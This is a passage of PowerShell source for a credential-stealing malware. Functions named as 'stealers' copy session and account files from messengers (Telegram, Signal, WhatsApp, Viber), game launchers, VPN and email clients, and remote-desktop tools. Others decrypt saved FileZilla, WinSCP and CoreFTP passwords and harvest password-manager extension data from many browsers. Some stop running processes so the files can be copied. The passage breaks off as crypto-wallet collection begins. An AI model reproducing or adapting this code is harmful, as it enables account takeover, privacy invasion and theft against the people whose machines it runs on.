        if (!(Test-Path $pathtele)) { return }
        $telegramProcess = Get-Process -Name $processname -ErrorAction SilentlyContinue
        if ($telegramProcess) {
            $telegramPID = $telegramProcess.Id; $telegramPath = (gwmi Win32_Process -Filter "ProcessId = $telegramPID").CommandLine.split('"')[1]
            Stop-Process -Id $telegramPID -Force
        }
        $telegramsession = Join-Path $folder_messaging "Telegram"
        New-Item -ItemType Directory -Force -Path $telegramsession | Out-Null
        $items = Get-ChildItem -Path $pathtele
		#!! MESSAGERS COPY
		$global:messagersCounter += 1
		#--------------
        foreach ($item in $items) {
            if ($item.GetType() -eq [System.IO.FileInfo]) {
                if (($item.Name.EndsWith("s") -and $item.Length -lt 200KB) -or
    ($item.Name.StartsWith("key_data") -or $item.Name.StartsWith("settings") -or $item.Name.StartsWith("configs") -or $item.Name.StartsWith("maps"))) {
                    Copy-Item -Path $item.FullName -Destination $telegramsession -Force 
                }
            }
            elseif ($item.GetType() -eq [System.IO.DirectoryInfo]) {
                if ($item.Name.Length -eq 16) {
                    $files = Get-ChildItem -Path $item.FullName -File             
                    foreach ($file in $files) {
                        if ($file.Name.EndsWith("s") -and $file.Length -lt 200KB) {
                            $destinationDirectory = Join-Path -Path $telegramsession -ChildPath $item.Name
                            if (-not (Test-Path -Path $destinationDirectory -PathType Container)) {
                                New-Item -ItemType Directory -Path $destinationDirectory | Out-Null 
                            }
                            Copy-Item -Path $file.FullName -Destination $destinationDirectory -Force 
                        }
                    }
                }
            }
        }
        try { (Start-Process -FilePath $telegramPath) } catch {}   
    }
    telegramstealer

    # Element  
    function elementstealer {
        $elementfolder = "$env:userprofile\AppData\Roaming\Element"
        if (!(Test-Path $elementfolder)) { return }
        $element_session = "$folder_messaging\Element"
        New-Item -ItemType Directory -Force -Path $element_session | Out-Null
        Copy-Item -Path "$elementfolder\IndexedDB" -Destination $element_session -Recurse -force 
        Copy-Item -Path "$elementfolder\Local Storage" -Destination $element_session -Recurse -force 
		#!! MESSAGERS COPY
		$global:messagersCounter += 1
		#--------------
    }
    elementstealer

    # ICQ  
    function icqstealer {
        $icqfolder = "$env:userprofile\AppData\Roaming\ICQ"
        if (!(Test-Path $icqfolder)) { return }
        $icq_session = "$folder_messaging\ICQ"
        New-Item -ItemType Directory -Force -Path $icq_session | Out-Null
        Copy-Item -Path "$icqfolder\0001" -Destination $icq_session -Recurse -force 
		#!! MESSAGERS COPY
		$global:messagersCounter += 1
		#--------------
    }
    icqstealer

    # Signal  
    function signalstealer {
        $signalfolder = "$env:userprofile\AppData\Roaming\Signal"
        if (!(Test-Path $signalfolder)) { return }
        $signal_session = "$folder_messaging\Signal"
        New-Item -ItemType Directory -Force -Path $signal_session | Out-Null
        Copy-Item -Path "$signalfolder\sql" -Destination $signal_session -Recurse -force
        Copy-Item -Path "$signalfolder\attachments.noindex" -Destination $signal_session -Recurse -force
        Copy-Item -Path "$signalfolder\config.json" -Destination $signal_session -Recurse -force
		#!! MESSAGERS COPY
		$global:messagersCounter += 1
		#--------------
    } 
    signalstealer


    # Viber  
    function viberstealer {
        $viberfolder = "$env:userprofile\AppData\Roaming\ViberPC"
        if (!(Test-Path $viberfolder)) { return }
        $viber_session = "$folder_messaging\Viber"
        New-Item -ItemType Directory -Force -Path $viber_session | Out-Null
        $pattern = "^([\+|0-9][0-9.]{1,12})$"
        $directories = Get-ChildItem -Path $viberfolder -Directory | Where-Object { $_.Name -match $pattern }
        $rootFiles = Get-ChildItem -Path $viberfolder -File | Where-Object { $_.Name -match "(?i)\.db$|\.db-wal$" }
        foreach ($rootFile in $rootFiles) { Copy-Item -Path $rootFile.FullName -Destination $viber_session -Force }    
        foreach ($directory in $directories) {
            $destinationPath = Join-Path -Path $viber_session -ChildPath $directory.Name
            Copy-Item -Path $directory.FullName -Destination $destinationPath -Force        
            $files = Get-ChildItem -Path $directory.FullName -File -Recurse -Include "*.db", "*.db-wal" | Where-Object { -not $_.PSIsContainer }
            foreach ($file in $files) {
                $destinationPathFiles = Join-Path -Path $destinationPath -ChildPath $file.Name
                Copy-Item -Path $file.FullName -Destination $destinationPathFiles -Force
            }
        }
		#!! MESSAGERS COPY
		$global:messagersCounter += 1
		#--------------
    }
    viberstealer


    # Whatsapp  
    function whatsappstealer {
        $whatsapp_session = "$folder_messaging\Whatsapp"
        New-Item -ItemType Directory -Force -Path $whatsapp_session | Out-Null
        $regexPattern = "^[a-z0-9]+\.WhatsAppDesktop_[a-z0-9]+$"
        $parentFolder = Get-ChildItem -Path "$env:localappdata\Packages" -Directory | Where-Object { $_.Name -match $regexPattern }
        if ($parentFolder) {
			#!! MESSAGERS COPY
			$global:messagersCounter += 1
			#--------------
            $localStateFolders = Get-ChildItem -Path $parentFolder.FullName -Filter "LocalState" -Recurse -Directory
            foreach ($localStateFolder in $localStateFolders) {
                $profilePicturesFolder = Get-ChildItem -Path $localStateFolder.FullName -Filter "profilePictures" -Recurse -Directory
                if ($profilePicturesFolder) {
                    $destinationPath = Join-Path -Path $whatsapp_session -ChildPath $localStateFolder.Name
                    $profilePicturesDestination = Join-Path -Path $destinationPath -ChildPath "profilePictures"
                    Copy-Item -Path $profilePicturesFolder.FullName -Destination $profilePicturesDestination -Recurse -ErrorAction SilentlyContinue
                }
            }
            foreach ($localStateFolder in $localStateFolders) {
                $filesToCopy = Get-ChildItem -Path $localStateFolder.FullName -File | Where-Object { $_.Length -le 10MB -and $_.Name -match "(?i)\.db$|\.db-wal|\.dat$" }
                $destinationPath = Join-Path -Path $whatsapp_session -ChildPath $localStateFolder.Name
                Copy-Item -Path $filesToCopy.FullName -Destination $destinationPath -Recurse 
            }
        }
    }
    whatsappstealer

    # Skype 
    function skype_stealer {
        $skypefolder = "$env:appdata\microsoft\skype for desktop"
        if (!(Test-Path $skypefolder)) { return }
        $skype_session = "$folder_messaging\Skype"
        New-Item -ItemType Directory -Force -Path $skype_session | Out-Null
        Copy-Item -Path "$skypefolder\Local Storage" -Destination $skype_session -Recurse -force
		#!! MESSAGERS COPY
		$global:messagersCounter += 1
		#--------------
    }
    skype_stealer
    
    
    # Pidgin 
    function pidgin_stealer {
        $pidgin_folder = "$env:userprofile\AppData\Roaming\.purple"
        if (!(Test-Path $pidgin_folder)) { return }
        $pidgin_accounts = "$folder_messaging\Pidgin"
        New-Item -ItemType Directory -Force -Path $pidgin_accounts | Out-Null
        Copy-Item -Path "$pidgin_folder\accounts.xml" -Destination $pidgin_accounts -Recurse -force 
		#!! MESSAGERS COPY
		$global:messagersCounter += 1
		#--------------
    }
    pidgin_stealer
    
    # Tox 
    function tox_stealer {
        $tox_folder = "$env:appdata\Tox"
        if (!(Test-Path $tox_folder)) { return }
        $tox_session = "$folder_messaging\Tox"
        New-Item -ItemType Directory -Force -Path $tox_session | Out-Null
        Get-ChildItem -Path "$tox_folder" |  Copy-Item -Destination $tox_session -Recurse -Force
		#!! MESSAGERS COPY
		$global:messagersCounter += 1
		#--------------
    }
    tox_stealer

    #----------------#
    #  GAMING        #
    #----------------#
    
    # Steam 
    function steamstealer {
        $steamfolder = ("${Env:ProgramFiles(x86)}\Steam")
        if (!(Test-Path $steamfolder)) { return }
        $steam_session = "$folder_gaming\Steam"
        New-Item -ItemType Directory -Force -Path $steam_session | Out-Null
        Copy-Item -Path "$steamfolder\config" -Destination $steam_session -Recurse -force
        $ssfnfiles = @("ssfn$1")
        foreach ($file in $ssfnfiles) {
            Get-ChildItem -path $steamfolder -Filter ([regex]::escape($file) + "*") -Recurse -File | ForEach-Object { Copy-Item -path $PSItem.FullName -Destination $steam_session }
        }
		#!! GAMING COPY
		$global:gamesCounter += 1
		#--------------
    }
    steamstealer

    # Minecraft 
    function minecraftstealer {
        $minecraft_session = "$folder_gaming\Minecraft"
        New-Item -ItemType Directory -Force -Path $minecraft_session | Out-Null
        $minecraft_paths = @{
            "Minecraft" = @{
                "Intent"          = Join-Path $env:userprofile "intentlauncher\launcherconfig"
                "Lunar"           = Join-Path $env:userprofile ".lunarclient\settings\game\accounts.json"
                "TLauncher"       = Join-Path $env:userprofile "AppData\Roaming\.minecraft\TlauncherProfiles.json"
                "Feather"         = Join-Path $env:userprofile "AppData\Roaming\.feather\accounts.json"
                "Meteor"          = Join-Path $env:userprofile "AppData\Roaming\.minecraft\meteor-client\accounts.nbt"
                "Impact"          = Join-Path $env:userprofile "AppData\Roaming\.minecraft\Impact\alts.json"
                "Novoline"        = Join-Path $env:userprofile "AppData\Roaming\.minecraft\Novoline\alts.novo"
                "CheatBreakers"   = Join-Path $env:userprofile "AppData\Roaming\.minecraft\cheatbreaker_accounts.json"
                "Microsoft Store" = Join-Path $env:userprofile "AppData\Roaming\.minecraft\launcher_accounts_microsoft_store.json"
                "Rise"            = Join-Path $env:userprofile "AppData\Roaming\.minecraft\Rise\alts.txt"
                "Rise (Intent)"   = Join-Path $env:userprofile "intentlauncher\Rise\alts.txt"
                "Paladium"        = Join-Path $env:userprofile "AppData\Roaming\paladium-group\accounts.json"
                "PolyMC"          = Join-Path $env:userprofile "AppData\Roaming\PolyMC\accounts.json"
                "Badlion"         = Join-Path $env:userprofile "AppData\Roaming\Badlion Client\accounts.json"
            }
        } 
        foreach ($launcher in $minecraft_paths.Keys) {
            foreach ($pathName in $minecraft_paths[$launcher].Keys) {
                $sourcePath = $minecraft_paths[$launcher][$pathName]
                if (Test-Path $sourcePath) {
                    $destination = Join-Path -Path $minecraft_session -ChildPath $pathName
                    New-Item -ItemType Directory -Path $destination -Force | Out-Null
                    Copy-Item -Path $sourcePath -Destination $destination -Recurse -Force
					#!! GAMING COPY
					$global:gamesCounter += 1
					#--------------
                }
            }
        }
    }
    minecraftstealer

    # Epicgames 
    function epicgames_stealer {
        $epicgamesfolder = "$env:localappdata\EpicGamesLauncher"
        if (!(Test-Path $epicgamesfolder)) { return }
        $epicgames_session = "$folder_gaming\EpicGames"
        New-Item -ItemType Directory -Force -Path $epicgames_session | Out-Null
        Copy-Item -Path "$epicgamesfolder\Saved\Config" -Destination $epicgames_session -Recurse -force
        Copy-Item -Path "$epicgamesfolder\Saved\Logs" -Destination $epicgames_session -Recurse -force
        Copy-Item -Path "$epicgamesfolder\Saved\Data" -Destination $epicgames_session -Recurse -force
		#!! GAMING COPY
		$global:gamesCounter += 1
		#--------------
    }
    epicgames_stealer

    # Ubisoft 
    function ubisoftstealer {
        $ubisoftfolder = "$env:localappdata\Ubisoft Game Launcher"
        if (!(Test-Path $ubisoftfolder)) { return }
        $ubisoft_session = "$folder_gaming\Ubisoft"
        New-Item -ItemType Directory -Force -Path $ubisoft_session | Out-Null
        Copy-Item -Path "$ubisoftfolder" -Destination $ubisoft_session -Recurse -force
		#!! GAMING COPY
		$global:gamesCounter += 1
		#--------------
    }
    ubisoftstealer

    # EA 
    function electronic_arts {
        $eafolder = "$env:localappdata\Electronic Arts\EA Desktop\CEF"
        if (!(Test-Path $eafolder)) { return }
        $ea_session = "$folder_gaming\Electronic Arts"
        New-Item -ItemType Directory -Path $ea_session -Force | Out-Null
        $parentDirName = (Get-Item $eafolder).Parent.Name
        $destination = Join-Path $ea_session $parentDirName
        New-Item -ItemType Directory -Path $destination -Force | Out-Null
        Copy-Item -Path $eafolder -Destination $destination -Recurse -Force
		#!! GAMING COPY
		$global:gamesCounter += 1
		#--------------
    }
    electronic_arts

    # Growtopia 
    function growtopiastealer {
        $growtopiafolder = "$env:localappdata\Growtopia"
        if (!(Test-Path $growtopiafolder)) { return }
        $growtopia_session = "$folder_gaming\Growtopia"
        New-Item -ItemType Directory -Force -Path $growtopia_session | Out-Null
        $save_file = "$growtopiafolder\save.dat"
		#!! GAMING COPY
		$global:gamesCounter += 1
		#--------------
        if (Test-Path $save_file) { Copy-Item -Path $save_file -Destination $growtopia_session } 
    }
    growtopiastealer

    # Battle.net
    function battle_net_stealer {
        $battle_folder = "$env:appdata\Battle.net"
        if (!(Test-Path $battle_folder)) { return }
        $battle_session = "$folder_gaming\Battle.net"
        New-Item -ItemType Directory -Force -Path $battle_session | Out-Null
        $files = Get-ChildItem -Path $battle_folder -File -Recurse -Include "*.db", "*.config" 
		#!! GAMING COPY
		$global:gamesCounter += 1
		#--------------
        foreach ($file in $files) {
            Copy-Item -Path $file.FullName -Destination $battle_session
        }
    }
    battle_net_stealer

    #-------------------#
    #  VPN CLIENTS      #
    #-------------------#

    # ProtonVPN
    function protonvpnstealer {   
        $protonvpnfolder = "$env:localappdata\protonvpn"  
        if (!(Test-Path $protonvpnfolder)) { return }
        $protonvpn_account = "$folder_vpn\ProtonVPN"
        New-Item -ItemType Directory -Force -Path $protonvpn_account | Out-Null
        $pattern = "^(ProtonVPN_Url_[A-Za-z0-9]+)$"
        $directories = Get-ChildItem -Path $protonvpnfolder -Directory | Where-Object { $_.Name -match $pattern }
        foreach ($directory in $directories) {
            $destinationPath = Join-Path -Path $protonvpn_account -ChildPath $directory.Name
            Copy-Item -Path $directory.FullName -Destination $destinationPath -Recurse -Force
        }
		$global:vpnCounter = $true
    }
    protonvpnstealer


    #Surfshark VPN
    function surfsharkvpnstealer {
        $surfsharkvpnfolder = "$env:appdata\Surfshark"
        if (!(Test-Path $surfsharkvpnfolder)) { return }
        $surfsharkvpn_account = "$folder_vpn\Surfshark"
        New-Item -ItemType Directory -Force -Path $surfsharkvpn_account | Out-Null
        Get-ChildItem $surfsharkvpnfolder -Include @("data.dat", "settings.dat", "settings-log.dat", "private_settings.dat") -Recurse | Copy-Item -Destination $surfsharkvpn_account
		$global:vpnCounter = $true
	}
    surfsharkvpnstealer
    
    # OpenVPN 
    function openvpn_stealer {
        $openvpnfolder = "$env:userprofile\AppData\Roaming\OpenVPN Connect"
        if (!(Test-Path $openvpnfolder)) { return }
        $openvpn_accounts = "$folder_vpn\OpenVPN"
        New-Item -ItemType Directory -Force -Path $openvpn_accounts | Out-Null
        Copy-Item -Path "$openvpnfolder\profiles" -Destination $openvpn_accounts -Recurse -force 
        Copy-Item -Path "$openvpnfolder\config.json" -Destination $openvpn_accounts -Recurse -force 
		$global:vpnCounter = $true
    }
    openvpn_stealer
    
	#------------------------#
	#  EMAIL CLIENTS         #
	#------------------------#
	
    # Thunderbird 
    function thunderbirdbackup {
        $thunderbirdfolder = "$env:USERPROFILE\AppData\Roaming\Thunderbird\Profiles"
        if (!(Test-Path $thunderbirdfolder)) { return }
        $thunderbirdbackup = "$folder_email\Thunderbird"
        New-Item -ItemType Directory -Force -Path $thunderbirdbackup | Out-Null
        $pattern = "^[a-z0-9]+\.default-esr$"
        $directories = Get-ChildItem -Path $thunderbirdfolder -Directory | Where-Object { $_.Name -match $pattern }
        $filter = @("key4.db", "key3.db", "logins.json", "cert9.db", "*.js")
		#!! MESSAGERS COPY
		$global:messagersCounter += 1
		#--------------
        foreach ($directory in $directories) {
            $destinationPath = Join-Path -Path $thunderbirdbackup -ChildPath $directory.Name
            New-Item -ItemType Directory -Force -Path $destinationPath | Out-Null
            foreach ($filePattern in $filter) {
                Get-ChildItem -Path $directory.FullName -Recurse -Filter $filePattern -File | ForEach-Object {
                    $relativePath = $_.FullName.Substring($directory.FullName.Length).TrimStart('\')
                    $destFilePath = Join-Path -Path $destinationPath -ChildPath $relativePath
                    $destFileDir = Split-Path -Path $destFilePath -Parent
                    if (!(Test-Path -Path $destFileDir)) {
                        New-Item -ItemType Directory -Force -Path $destFileDir | Out-Null
                    }
                    Copy-Item -Path $_.FullName -Destination $destFilePath -Force
                }
            }
        }
    }
    thunderbirdbackup
	
    # MailBird
    function mailbird_backup {
        $mailbird_folder = "$env:localappdata\MailBird"
        if (!(Test-Path $mailbird_folder)) { return }
        $mailbird_db = "$folder_email\MailBird"
        New-Item -ItemType Directory -Force -Path $mailbird_db | Out-Null
        Copy-Item -Path "$mailbird_folder\Store\Store.db" -Destination $mailbird_db -Recurse -force
		#!! MESSAGERS COPY
		$global:messagersCounter += 1
		#--------------
    } 
    mailbird_backup

	#-------------------#
    #  VNC CLIENTS      #
    #-------------------#
	
	# AnyDesk
	function anydesk_backup {
		$sourcePath = "$env:USERPROFILE\AppData\Roaming\AnyDesk"
		$destinationPath = "$vnc_clients\"
		$pathLogFile = "$destinationPath\AnyDesk\backup_path.txt"
		if (-Not (Test-Path -Path $sourcePath)) {
			Write-Output "[!] The source AnyDesk directory $sourcePath does not exist." -ForegroundColor Red
			return
		}
		$anydeskProcess = Get-Process -Name "AnyDesk" -ErrorAction SilentlyContinue
		if ($anydeskProcess) {
			Write-Output "[!] AnyDesk is currently running. Stopping the process..." -ForegroundColor Red
			Stop-Process -Name "AnyDesk" -Force
			Start-Sleep -Seconds 5
		}
		if (-Not (Test-Path -Path $destinationPath)) {
			New-Item -ItemType Directory -Path $destinationPath
		}
		Copy-Item -Path $sourcePath -Destination $destinationPath -Recurse -Force
		$sourcePath | Out-File -FilePath $pathLogFile -Encoding UTF8
		Write-Output "[+] Successfully backed up AnyDesk directory: $latestDirPath" -ForegroundColor Green
		$global:vncCounter = $true
	}
	anydesk_backup
	
	# TeamViewer
	function teamviewer_backup {
		$sourcePath = "$env:USERPROFILE\AppData\Local\TeamViewer\EdgeBrowserControl\Temporary"
		$destinationPath = "$vnc_clients\TeamViewer"
		$pathLogFile = "$destinationPath\backup_path.txt"
		if (-Not (Test-Path -Path $sourcePath)) {
			Write-Output "[!] The source TeamViewer directory does not exist." -ForegroundColor Red
			return
		}
		$twProcess = Get-Process -Name "TeamViewer" -ErrorAction SilentlyContinue
		if ($twProcess) {
			Write-Output "[!] TeamViewer is currently running. Stopping the process..." -ForegroundColor Red
			Stop-Process -Name "TeamViewer" -Force
			Start-Sleep -Seconds 5
		}
		if (-Not (Test-Path -Path $destinationPath)) {
			New-Item -ItemType Directory -Path $destinationPath
		}
		$latestDir = Get-ChildItem -Path $sourcePath | Where-Object { $_.PSIsContainer } | Sort-Object LastWriteTime -Descending | Select-Object -First 1
		if ($latestDir) {
			Copy-Item -Path $latestDir.FullName -Destination $destinationPath -Recurse -Force
			$latestDirPath = $latestDir.FullName
			$latestDirPath | Out-File -FilePath $pathLogFile -Encoding UTF8
			Write-Output "[+] Successfully backed up the latest TeamViewer directory: $latestDirPath" -ForegroundColor Green
			$global:vncCounter = $true
		} else {
			Write-Output "[!] No directories found in $sourcePath." -ForegroundColor Red
		}
	}
	teamviewer_backup
	
	Write-Output "[*] VNC Clients backup success." -ForegroundColor Green

    #-------------------#
    #  FTP CLIENTS      #
    #-------------------#

    # Filezilla 
    function filezilla_stealer {
        $FileZillafolder = "$env:appdata\FileZilla"
        if (!(Test-Path $FileZillafolder)) { return }
        $filezilla_hosts = "$ftp_clients\FileZilla"
        New-Item -ItemType Directory -Force -Path $filezilla_hosts | Out-Null
        $recentServersXml = Join-Path -Path $FileZillafolder -ChildPath 'recentservers.xml'
        $siteManagerXml = Join-Path -Path $FileZillafolder -ChildPath 'sitemanager.xml'
        function ParseServerInfo {
            param ([string]$xmlContent)
            $matches = [regex]::Match($xmlContent, "<Host>(.*?)</Host>.*<Port>(.*?)</Port>")
            $serverHost = $matches.Groups[1].Value
            $serverPort = $matches.Groups[2].Value
            $serverUser = [regex]::Match($xmlContent, "<User>(.*?)</User>").Groups[1].Value
            # Check if both User and Pass are blank
            if ([string]::IsNullOrWhiteSpace($serverUser)) { return "Host: $serverHost `nPort: $serverPort`n" }
            # if User is not blank, continue with authentication details
            $encodedPass = [regex]::Match($xmlContent, "<Pass encoding=`"base64`">(.*?)</Pass>").Groups[1].Value
            $decodedPass = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($encodedPass))
            return "Host: $serverHost `nPort: $serverPort `nUser: $serverUser `nPass: $decodedPass`n"
        }       
        $serversInfo = @()
        foreach ($xmlFile in @($recentServersXml, $siteManagerXml)) {
            if (Test-Path $xmlFile) {
                $xmlContent = Get-Content -Path $xmlFile
                $servers = [System.Collections.ArrayList]@()
                $xmlContent | Select-String -Pattern "<Server>" -Context 0, 10 | ForEach-Object {
                    $serverInfo = ParseServerInfo -xmlContent $_.Context.PostContext
                    $servers.Add($serverInfo) | Out-Null
                }
                $serversInfo += $servers -join "`n"
            }
        }
        $serversInfo | Out-File -FilePath "$filezilla_hosts\Hosts.txt" -Force
		$global:ftpCounter = $true
        Write-Host "[!] Filezilla Session information saved" -ForegroundColor Green
    }
    filezilla_stealer
	
    #  WinSCP  
    function Get-WinSCPSessions {
        $registryPath = "SOFTWARE\Martin Prikryl\WinSCP 2\Sessions"
        $winscp_session = "$ftp_clients\WinSCP"
        New-Item -ItemType Directory -Force -Path $winscp_session | Out-Null
        $outputPath = "$winscp_session\WinSCP-sessions.txt"
        $output = "WinSCP Sessions`n`n"
        $hive = [UInt32] "2147483649" # HKEY_CURRENT_USER
        function Get-RegistryValue {
            param ([string]$subKey, [string]$valueName)
            $result = Invoke-WmiMethod -Namespace "root\default" -Class StdRegProv -Name GetStringValue -ArgumentList $hive, $subKey, $valueName
            return $result.sValue
        }
        function Get-RegistrySubKeys {
            param ([string]$subKey)
            $result = Invoke-WmiMethod -Namespace "root\default" -Class StdRegProv -Name EnumKey -ArgumentList $hive, $subKey
            return $result.sNames
        }
        $sessionKeys = Get-RegistrySubKeys -subKey $registryPath
        if ($null -eq $sessionKeys) {
            Write-Host "[!] Failed to enumerate registry keys under $registryPath" -ForegroundColor Red
            return
        }
        function DecryptNextCharacterWinSCP {
            param ([string]$remainingPass)
            $Magic = 163
            $flagAndPass = "" | Select-Object -Property flag, remainingPass
            $firstval = ("0123456789ABCDEF".indexOf($remainingPass[0]) * 16)
            $secondval = "0123456789ABCDEF".indexOf($remainingPass[1])
            $Added = $firstval + $secondval
            $decryptedResult = (((-bnot ($Added -bxor $Magic)) % 256) + 256) % 256
            $flagAndPass.flag = $decryptedResult
            $flagAndPass.remainingPass = $remainingPass.Substring(2)
            return $flagAndPass
        }
        function DecryptWinSCPPassword {
            param ([string]$SessionHostname, [string]$SessionUsername, [string]$Password)
            $CheckFlag = 255
            $Magic = 163
            $key = $SessionHostname + $SessionUsername
            $values = DecryptNextCharacterWinSCP -remainingPass $Password
            $storedFlag = $values.flag
            if ($values.flag -eq $CheckFlag) {
                $values.remainingPass = $values.remainingPass.Substring(2)
                $values = DecryptNextCharacterWinSCP -remainingPass $values.remainingPass
            }
            $len = $values.flag
            $values = DecryptNextCharacterWinSCP -remainingPass $values.remainingPass
            $values.remainingPass = $values.remainingPass.Substring(($values.flag * 2))
            $finalOutput = ""
            for ($i = 0; $i -lt $len; $i++) {
                $values = DecryptNextCharacterWinSCP -remainingPass $values.remainingPass
                $finalOutput += [char]$values.flag
            }
            if ($storedFlag -eq $CheckFlag) {
                return $finalOutput.Substring($key.Length)
            }
            return $finalOutput
        }
        foreach ($sessionKey in $sessionKeys) {
            $sessionName = $sessionKey
            $sessionPath = "$registryPath\$sessionName"
            $hostname = Get-RegistryValue -subKey $sessionPath -valueName "HostName"
            $username = Get-RegistryValue -subKey $sessionPath -valueName "UserName"
            $encryptedPassword = Get-RegistryValue -subKey $sessionPath -valueName "Password"
            if ($encryptedPassword) {
                $password = DecryptWinSCPPassword -SessionHostname $hostname -SessionUsername $username -Password $encryptedPassword
            }
            else {
                $password = "No password saved"
            }
            $output += "Session  : $sessionName`n"
            $output += "Hostname : $hostname`n"
            $output += "Username : $username`n"
            $output += "Password : $password`n`n"
        }
        $output | Out-File -FilePath $outputPath
		$global:winscpCounter = $true
        Write-Host "[!] WinSCP Session information saved" -ForegroundColor Green
    }
    Get-WinSCPSessions
	
    # coreftp
    function CoreFTP_backup {
    $coreftp = "$ftp_clients\CoreFTP"
    New-Item -ItemType Directory -Force -Path $coreftp | Out-Null
    function Decrypt-String {
        param ([string]$hexString)
        $hexString = $hexString -replace '\s', ''
        $byteArray = @()
        for ($i = 0; $i -lt $hexString.Length; $i += 2) {
            $byteArray += [System.Convert]::ToByte($hexString.Substring($i, 2), 16)
        }
        $key = [System.Text.Encoding]::ASCII.GetBytes("hdfzpysvpzimorhk")
        $aes = [System.Security.Cryptography.Aes]::Create()
        $aes.Key = $key
        $aes.Mode = [System.Security.Cryptography.CipherMode]::ECB
        $aes.Padding = [System.Security.Cryptography.PaddingMode]::None
        $decryptor = $aes.CreateDecryptor()
        $decryptedBytes = $decryptor.TransformFinalBlock($byteArray, 0, $byteArray.Length)
        $aes.Dispose()
        $decryptedString = [System.Text.Encoding]::UTF8.GetString($decryptedBytes).Trim([char]0)
        return $decryptedString
    }

    function Get-RegistryValues {
        $regPath = 'HKCU:\Software\FTPware\CoreFTP\Sites'
        if (Test-Path $regPath) {
            $profiles = Get-ChildItem -Path $regPath -ErrorAction SilentlyContinue
            $output = "[CoreFTP]`n`n"
            foreach ($profile in $profiles) {
                $profileKey = Get-Item -LiteralPath $profile.PSPath -ErrorAction SilentlyContinue
                $profileValues = Get-ItemProperty -Path $profile.PSPath -ErrorAction SilentlyContinue
                $values = @{
                    Host = $profileValues.Host
                    Port = $profileValues.Port
                    User = $profileValues.User
                    Password = "N/A"
                }
                if ($profileValues.PW) {
                    try {
                        $values.Password = Decrypt-String -hexString $profileValues.PW
                    } catch {
                        Write-Host "[!] ERROR: Failed to decrypt password: $_"
                    }
                }
                if ($values) {
                    $output += "Host: $($values.Host)`n"
                    $output += "Port: $($values.Port)`n"
                    $output += "Username: $($values.User)`n"
                    $output += "Password: $($values.Password)`n"
                    $output += "`n"
                }
            }
            return $output
        } else {
            return $null
        }
    }

    try {
        $results = Get-RegistryValues
        if ($results) {
            $results | Out-File -FilePath "$coreftp\coreftp.txt" -Encoding UTF8
            Write-Host "[!] CoreFTP passwords saved to $coreftp" -ForegroundColor Green
			$global:ftpCounter = $true
        } else {
            Write-Host "[!] No CoreFTP profiles found." -ForegroundColor Red
        }
         } catch {
        Write-Host "[!] INFO: CoreFTP not installed or failed to retrieve registry values" -ForegroundColor Red
        }
    }
    CoreFTP_backup
	
    # smartftp
    function smartftp_backup {
    $sourceDir = "$env:appdata\SmartFTP\Client 2.0\"
    $SmartFTP_dir = "$ftp_clients\SmartFTP"
	New-Item -ItemType Directory -Force -Path $SmartFTP_dir | Out-Null
    if (Test-Path -Path $sourceDir) {
        Get-ChildItem $sourceDir -Include @("*.dat","*.xml") -EA Ignore -Recurse | Copy-Item -Destination $SmartFTP_dir
        Write-Host "[!] SmartFTP files have been copied to $SmartFTP_dir" -ForegroundColor Green
		$global:ftpCounter = $true
    } else {
        Write-Host "[!] Source directory not found: $sourceDir" -ForegroundColor Red
        }
    }
    smartftp_backup

    #------------------------#
    #  PASSWORD MANAGERS     #
    #------------------------#
    function password_managers {
        $browserPaths = @{
            "Brave"       = Join-Path $env:LOCALAPPDATA "BraveSoftware\Brave-Browser\User Data"
            "Chrome"      = Join-Path $env:LOCALAPPDATA "Google\Chrome\User Data"
            "Chromium"    = Join-Path $env:LOCALAPPDATA "Chromium\User Data"
            "Edge"        = Join-Path $env:LOCALAPPDATA "Microsoft\Edge\User Data"
            "EpicPrivacy" = Join-Path $env:LOCALAPPDATA "Epic Privacy Browser\User Data"
            "Iridium"     = Join-Path $env:LOCALAPPDATA "Iridium\User Data"
            "Opera"       = Join-Path $env:APPDATA "Opera Software\Opera Stable"
            "OperaGX"     = Join-Path $env:APPDATA "Opera Software\Opera GX Stable"
            "Vivaldi"     = Join-Path $env:LOCALAPPDATA "Vivaldi\User Data"
            "Yandex"      = Join-Path $env:LOCALAPPDATA "Yandex\YandexBrowser\User Data"
        }
        $password_mgr_dirs = @{
            "bhghoamapcdpbohphigoooaddinpkbai" = "Authenticator"
            "aeblfdkhhhdcdjpifhhbdiojplfjncoa" = "1Password"                  
            "eiaeiblijfjekdanodkjadfinkhbfgcd" = "NordPass" 
            "fdjamakpfbbddfjaooikfcpapjohcfmg" = "DashLane" 
            "nngceckbapebfimnlniiiahkandclblb" = "Bitwarden" 
            "pnlccmojcmeohlpggmfnbbiapkmbliob" = "RoboForm" 
            "bfogiafebfohielmmehodmfbbebbbpei" = "Keeper" 
            "cnlhokffphohmfcddnibpohmkdfafdli" = "MultiPassword" 
            "oboonakemofpalcgghocfoadofidjkkk" = "KeePassXC" 
            "hdokiejnpimakedhajhdlcegeplioahd" = "LastPass" 
        }
        foreach ($browser in $browserPaths.GetEnumerator()) {
            $browserName = $browser.Key
            $browserPath = $browser.Value
            if (Test-Path $browserPath) {
                Get-ChildItem -Path $browserPath -Recurse -Directory -Filter "Local Extension Settings" -ErrorAction SilentlyContinue | ForEach-Object {
                    $localExtensionsSettingsDir = $_.FullName
                    foreach ($password_mgr_dir in $password_mgr_dirs.GetEnumerator()) {
                        $passwordmgrkey = $password_mgr_dir.Key
                        $password_manager = $password_mgr_dir.Value
                        $extentionPath = Join-Path $localExtensionsSettingsDir $passwordmgrkey
                        if (Test-Path $extentionPath) {
                            if (Get-ChildItem $extentionPath -ErrorAction SilentlyContinue) {
                                try {
                                    $password_mgr_browser = "$password_manager ($browserName)"
                                    $password_dir_path = Join-Path $password_managers $password_mgr_browser
                                    New-Item -ItemType Directory -Path $password_dir_path -Force | out-null
                                    Copy-Item -Path $extentionPath -Destination $password_dir_path -Recurse -Force
                                    $locationFile = Join-Path $password_dir_path "Location.txt"
                                    $extentionPath | Out-File -FilePath $locationFile -Force
                                    Write-Host "[!] Copied $password_manager from $extentionPath to $password_dir_path" -ForegroundColor Green
                                }
                                catch {
                                    Write-Host "[!] Failed to copy $password_manager from $extentionPath" -ForegroundColor Red
                                }
                            }
                        }
                    }
                }
            }
        }
    }
    password_managers

    #----------------------------------------#
    #  CRYPTO WALLETS (desktop and browser)  #
    #----------------------------------------#
    function Local_Crypto_Wallets {
        $wallet_paths = @{
            "Local Wallets" = @{
                "Armory"           = Join-Path $env:appdata      "\Armory\*.wallet"
